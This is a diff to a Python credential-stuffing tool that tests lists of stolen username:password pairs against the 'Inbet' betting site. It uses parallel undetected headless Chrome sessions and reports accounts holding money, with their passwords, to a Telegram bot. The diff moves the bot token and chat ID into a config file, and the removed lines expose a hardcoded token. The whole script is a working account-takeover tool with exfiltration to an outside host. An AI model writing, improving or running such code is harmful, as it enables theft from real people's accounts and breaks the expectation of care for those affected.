@@ -22,10 +22,52 @@ stop_flag = False
 max_workers = 10
 headless_mode = True
 
-# ==================== CONFIG ====================
-TELEGRAM_BOT_TOKEN = "8261371308:AAEzFjN1Ufsr8yI6iY08gMLo5Va55lO_Guo"
-TELEGRAM_CHAT_ID = "7752036982"
-# =================================================
+# ==================== TELEGRAM CONFIG ====================
+TELEGRAM_BOT_TOKEN = None
+TELEGRAM_CHAT_ID = None
+
+
+def load_telegram_config(file_path="telegram.txt"):
+    """
+    Load Telegram bot token and chat id from telegram.txt.
+
+    Expected format (any of these keys, case-insensitive):
+        TOKEN=...
+        BOT_TOKEN=...
+        CHAT_ID=...
+        ID=...
+    Lines starting with '#' are ignored.
+    """
+    global TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID
+
+    try:
+        if not os.path.exists(file_path):
+            print(f"[WARNING] Telegram config file '{file_path}' not found. Telegram alerts DISABLED.")
+            return
+
+        with open(file_path, "r", encoding="utf-8") as f:
+            for line in f:
+                line = line.strip()
+                if not line or line.startswith("#"):
+                    continue
+
+                upper = line.upper()
+                if upper.startswith("TOKEN=") or upper.startswith("BOT_TOKEN="):
+                    TELEGRAM_BOT_TOKEN = line.split("=", 1)[1].strip()
+                elif upper.startswith("CHAT_ID=") or upper.startswith("ID="):
+                    TELEGRAM_CHAT_ID = line.split("=", 1)[1].strip()
+
+        if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
+            print("[INFO] Telegram settings loaded from telegram.txt.")
+        else:
+            print("[WARNING] Telegram config incomplete (TOKEN/CHAT_ID missing). Telegram alerts DISABLED.")
+
+    except Exception as e:
+        print(f"[ERROR] Could not read telegram config: {e}")
+        TELEGRAM_BOT_TOKEN = None
+        TELEGRAM_CHAT_ID = None
+# =========================================================
+
 
 def emergency_stop_listener():
     global stop_flag
@@ -40,10 +82,12 @@ def emergency_stop_listener():
                 stop_flag = True
                 os._exit(0)
 
+
 def read_credentials(file_path):
     with open(file_path, 'r', encoding='utf-8') as file:
         credentials = file.readlines()
     return [line.strip().split(':') for line in credentials]
+
 
 def init_driver(block_images=True):
     """Initialize undetected Chrome driver."""
@@ -66,7 +110,13 @@ def init_driver(block_images=True):
     driver.set_window_size(1920, 1080)
     return driver
 
+
 def send_telegram(username, password, balance, timestamp):
+    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
+        # No valid Telegram config – just skip sending
+        print(f"[INFO] Telegram config missing, NOT sending alert for {username}:{password}.")
+        return
+
     try:
         message = (
             f"🚨Inbet Balance Alert!\n"
@@ -80,6 +130,7 @@ def send_telegram(username, password, balance, timestamp):
         print(f"[TELEGRAM] Alert sent for {username}:{password} with balance {balance}")
     except Exception as e:
         print(f"[ERROR] Failed to send Telegram message: {e}")
+
 
 def login(credentials):
     username, password = credentials
@@ -101,10 +152,12 @@ def login(credentials):
                 driver.execute_script("arguments[0].click();", allow_all_btn)
         except Exception:
             print(f"[WARNING] 'Allow All Cookies' button not found for {username}. Continuing...")
-            
+
         try:
             login_button = wait.until(
-                EC.element_to_be_clickable((By.XPATH, "/html/body/div[3]/div[2]/div[1]/nav/div/div/div[3]/div/button[2]"))
+                EC.element_to_be_clickable(
+                    (By.XPATH, "/html/body/div[3]/div[2]/div[1]/nav/div/div/div[3]/div/button[2]")
+                )
             )
             driver.execute_script("arguments[0].click();", login_button)
         except:
@@ -169,8 +222,10 @@ def login(credentials):
         balance_value = float(formatted_amount.replace(',', '.'))
         if balance_value > 0.99:
             try:
-                winsound.PlaySound(r"C:\Users\petar\Desktop\inbet\inbet.wav",
-                                   winsound.SND_FILENAME | winsound.SND_ASYNC)
+                winsound.PlaySound(
+                    r"C:\Users\petar\Desktop\inbet\inbet.wav",
+                    winsound.SND_FILENAME | winsound.SND_ASYNC
+                )
             except:
                 print("[WARNING] Could not play sound.")
             timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -185,6 +240,7 @@ def login(credentials):
         traceback.print_exc()
     finally:
         driver.quit()
+
 
 def config_popup():
     """Popup window for user configuration."""
@@ -213,9 +269,15 @@ def config_popup():
     tk.Button(root, text="Start", command=on_submit, bg="#4CAF50", fg="white").pack(pady=10)
     root.mainloop()
 
+
 def main():
     global login_page_url, success_logins_file, stop_flag
+
+    # GUI for workers/headless
     config_popup()
+
+    # Load Telegram config from telegram.txt
+    load_telegram_config("telegram.txt")
 
     credentials_file = 'unique.txt'
     success_logins_file = r"C:\Users\petar\Desktop\inbet\balance_and_bets_sounds.txt"
@@ -231,6 +293,7 @@ def main():
 
     with ThreadPoolExecutor(max_workers=max_workers) as executor:
         executor.map(lambda cred: login(cred), credentials)
+
 
 if __name__ == "__main__":
     main()
